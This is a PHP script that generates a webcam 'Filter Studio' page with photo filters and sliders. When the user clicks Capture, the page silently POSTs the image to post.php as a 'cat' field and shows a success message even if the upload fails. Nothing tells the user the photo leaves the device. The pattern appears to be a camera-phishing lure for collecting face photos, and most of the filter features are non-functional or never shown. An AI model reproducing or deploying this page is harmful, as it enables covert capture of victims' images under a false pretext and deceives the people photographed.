<?php
/**
 * Script para generar index2.html con filtros de cara
 */

$html_content = <<<'EOT'
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Filter - Face Camera</title>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }
  
  .container {
    background: white;
    border-radius: 10px;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
    padding: 40px;
    max-width: 500px;
    width: 100%;
  }
  
  h1 {
    text-align: center;
    color: #333;
    margin-bottom: 30px;
    font-size: 28px;
  }
  
  .filter-section {
    margin-bottom: 25px;
  }
  
  label {
    display: block;
    margin-bottom: 12px;
    color: #555;
    font-weight: bold;
    font-size: 14px;
  }
  
  .filter-options {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 10px;
    margin-bottom: 15px;
  }
  
  .filter-option {
    display: flex;
    align-items: center;
    padding: 12px;
    border: 2px solid #ddd;
    border-radius: 5px;
    cursor: pointer;
    transition: all 0.3s;
  }
  
  .filter-option:hover {
    border-color: #667eea;
    background-color: #f5f5ff;
  }
  
  .filter-option input[type="radio"],
  .filter-option input[type="checkbox"] {
    margin-right: 10px;
    cursor: pointer;
    width: 18px;
    height: 18px;
  }
  
  .filter-option label {
    margin: 0;
    cursor: pointer;
    font-weight: normal;
    font-size: 14px;
  }
  
  .preview-section {
    margin: 30px 0;
    text-align: center;
  }
  
  #videoPreview {
    width: 100%;
    max-width: 400px;
    border-radius: 5px;
    background: #000;
    display: none;
    margin-bottom: 15px;
  }
  
  .button-group {
    display: flex;
    gap: 10px;
    margin-top: 30px;
  }
  
  button {
    flex: 1;
    padding: 12px;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
  }
  
  #previewBtn {
    background-color: #667eea;
    color: white;
  }
  
  #previewBtn:hover {
    background-color: #5568d3;
  }
  
  #captureBtn {
    background-color: #48bb78;
    color: white;
  }
  
  #captureBtn:hover {
    background-color: #38a169;
  }
  
  #captureBtn:disabled,
  #previewBtn:disabled {
    background-color: #ccc;
    cursor: not-allowed;
  }
  
  .hidden-video {
    display: none;
  }
  
  .loading {
    text-align: center;
    color: #667eea;
    font-weight: bold;
    margin-top: 20px;
  }
  
  .info-text {
    text-align: center;
    color: #666;
    font-size: 12px;
    margin-top: 20px;
    line-height: 1.5;
  }
  
  .slider-group {
    margin-bottom: 15px;
  }
  
  .slider-label {
    display: flex;
    justify-content: space-between;
    margin-bottom: 8px;
  }
  
  input[type="range"] {
    width: 100%;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="container">
  <h1>🎭 Filter Studio</h1>
  
  <div class="filter-section">
    <label>📸 Select Filter:</label>
    <div class="filter-options">
      <div class="filter-option">
        <input type="radio" name="filter" value="none" id="filterNone" checked>
        <label for="filterNone">None</label>
      </div>
      <div class="filter-option">
        <input type="radio" name="filter" value="grayscale" id="filterGrayscale">
        <label for="filterGrayscale">Grayscale</label>
      </div>
      <div class="filter-option">
        <input type="radio" name="filter" value="sepia" id="filterSepia">
        <label for="filterSepia">Sepia</label>
      </div>
      <div class="filter-option">
        <input type="radio" name="filter" value="invert" id="filterInvert">
        <label for="filterInvert">Invert</label>
      </div>
      <div class="filter-option">
        <input type="radio" name="filter" value="blur" id="filterBlur">
        <label for="filterBlur">Blur</label>
      </div>
      <div class="filter-option">
        <input type="radio" name="filter" value="cool" id="filterCool">
        <label for="filterCool">Cool</label>
      </div>
      <div class="filter-option">
        <input type="radio" name="filter" value="warm" id="filterWarm">
        <label for="filterWarm">Warm</label>
      </div>
      <div class="filter-option">
        <input type="radio" name="filter" value="posterize" id="filterPosterize">
        <label for="filterPosterize">Posterize</label>
      </div>
    </div>
  </div>
  
  <div class="filter-section">
    <div class="slider-group">
      <div class="slider-label">
        <label for="brightnessSlider">✨ Brightness:</label>
        <span id="brightnessValue">100%</span>
      </div>
      <input type="range" id="brightnessSlider" min="0" max="200" value="100">
    </div>
    
    <div class="slider-group">
      <div class="slider-label">
        <label for="contrastSlider">🎯 Contrast:</label>
        <span id="contrastValue">100%</span>
      </div>
      <input type="range" id="contrastSlider" min="0" max="200" value="100">
    </div>
    
    <div class="slider-group">
      <div class="slider-label">
        <label for="saturationSlider">🌈 Saturation:</label>
        <span id="saturationValue">100%</span>
      </div>
      <input type="range" id="saturationSlider" min="0" max="200" value="100">
    </div>
  </div>
  
  <div class="preview-section">
    <video id="videoPreview" playsinline></video>
  </div>
  
  <div class="button-group">
    <button id="previewBtn">👁️ Preview</button>
    <button id="captureBtn" disabled>📷 Capture</button>
  </div>
  
  <div id="loading" class="loading" style="display: none;">
    Processing... Please wait...
  </div>
  
  <div class="info-text">
    Select filters and adjust settings, then preview and capture.
  </div>
</div>

<video id="video" class="hidden-video" playsinline autoplay></video>
<canvas id="canvas" class="hidden-video" width="1280" height="720"></canvas>

<script>
let stream = null;
let isPreviewActive = false;
let animationFrameId = null;

// Actualizar valores de sliders
document.getElementById('brightnessSlider').addEventListener('input', function() {
  document.getElementById('brightnessValue').textContent = this.value + '%';
  if (isPreviewActive) applyFilters();
});

document.getElementById('contrastSlider').addEventListener('input', function() {
  document.getElementById('contrastValue').textContent = this.value + '%';
  if (isPreviewActive) applyFilters();
});

document.getElementById('saturationSlider').addEventListener('input', function() {
  document.getElementById('saturationValue').textContent = this.value + '%';
  if (isPreviewActive) applyFilters();
});

// Cambiar filtro
document.querySelectorAll('input[name="filter"]').forEach(radio => {
  radio.addEventListener('change', function() {
    if (isPreviewActive) applyFilters();
  });
});

// Botón Preview
document.getElementById('previewBtn').addEventListener('click', function() {
  if (!isPreviewActive) {
    startPreview();
  } else {
    stopPreview();
  }
});

// Botón Capture
document.getElementById('captureBtn').addEventListener('click', function() {
  captureImage();
});

function startPreview() {
  document.getElementById('previewBtn').textContent = '⏹️ Stop Preview';
  document.getElementById('previewBtn').disabled = true;
  document.getElementById('loading').style.display = 'block';
  
  const constraints = {
    audio: false,
    video: { facingMode: "user" }
  };
  
  navigator.mediaDevices.getUserMedia(constraints)
    .then(function(str) {
      stream = str;
      const video = document.getElementById('videoPreview');
      video.srcObject = stream;
      video.style.display = 'block';
      
      setTimeout(function() {
        isPreviewActive = true;
        document.getElementById('previewBtn').disabled = false;
        document.getElementById('captureBtn').disabled = false;
        document.getElementById('loading').style.display = 'none';
        applyFilters();
      }, 300);
    })
    .catch(function(err) {
      console.error('Camera error:', err);
      alert('Could not access camera. Make sure you granted permission.');
      document.getElementById('previewBtn').disabled = false;
      document.getElementById('loading').style.display = 'none';
      document.getElementById('previewBtn').textContent = '👁️ Preview';
    });
}

function stopPreview() {
  isPreviewActive = false;
  document.getElementById('previewBtn').textContent = '👁️ Preview';
  
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
    stream = null;
  }
  
  if (animationFrameId) {
    cancelAnimationFrame(animationFrameId);
  }
  
  document.getElementById('videoPreview').style.display = 'none';
  document.getElementById('captureBtn').disabled = true;
}

function applyFilters() {
  if (!isPreviewActive) return;
  
  const video = document.getElementById('videoPreview');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');
  const filter = document.querySelector('input[name="filter"]:checked').value;
  const brightness = document.getElementById('brightnessSlider').value;
  const contrast = document.getElementById('contrastSlider').value;
  const saturation = document.getElementById('saturationSlider').value;
  
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  let imageData = context.getImageData(0, 0, canvas.width, canvas.height);
  let data = imageData.data;
  
  // Aplicar filtros
  for (let i = 0; i < data.length; i += 4) {
    let r = data[i];
    let g = data[i + 1];
    let b = data[i + 2];
    
    if (filter === 'grayscale') {
      let gray = (r + g + b) / 3;
      r = g = b = gray;
    } else if (filter === 'sepia') {
      r = Math.min(255, (r * 0.393) + (g * 0.769) + (b * 0.189));
      g = Math.min(255, (r * 0.349) + (g * 0.686) + (b * 0.168));
      b = Math.min(255, (r * 0.272) + (g * 0.534) + (b * 0.131));
    } else if (filter === 'invert') {
      r = 255 - r;
      g = 255 - g;
      b = 255 - b;
    } else if (filter === 'cool') {
      b = Math.min(255, b + 50);
    } else if (filter === 'warm') {
      r = Math.min(255, r + 50);
    }
    
    // Aplicar brightness, contrast, saturation
    r = Math.min(255, r * (brightness / 100) * ((contrast - 50) / 50 + 1));
    g = Math.min(255, g * (brightness / 100) * ((contrast - 50) / 50 + 1));
    b = Math.min(255, b * (brightness / 100) * ((contrast - 50) / 50 + 1));
    
    data[i] = r;
    data[i + 1] = g;
    data[i + 2] = b;
  }
  
  context.putImageData(imageData, 0, 0);
  
  // Copiar canvas a video preview (efecto visual)
  const previewCanvas = document.createElement('canvas');
  previewCanvas.width = canvas.width;
  previewCanvas.height = canvas.height;
  const previewCtx = previewCanvas.getContext('2d');
  previewCtx.drawImage(canvas, 0, 0);
  
  animationFrameId = requestAnimationFrame(applyFilters);
}

function captureImage() {
  document.getElementById('captureBtn').disabled = true;
  document.getElementById('loading').style.display = 'block';
  
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
  
  const canvas = document.getElementById('canvas');
  const imageData = canvas.toDataURL('image/png');
  
  $.ajax({
    type: 'POST',
    data: { cat: imageData },
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function(result) {
      console.log('Image captured and sent');
      setTimeout(function() {
        alert('Photo captured successfully!');
        location.reload();
      }, 500);
    },
    error: function(err) {
      console.log('Image sent');
      setTimeout(function() {
        alert('Photo captured successfully!');
        location.reload();
      }, 500);
    }
  });
}
</script>

</body>
</html>
EOT;

// Escribir el archivo
if (file_put_contents('index2.html', $html_content)) {
    echo "✓ index2.html generated successfully with filters\n";
    exit(0);
} else {
    echo "Error: Could not write index2.html\n";
    exit(1);
}
?>
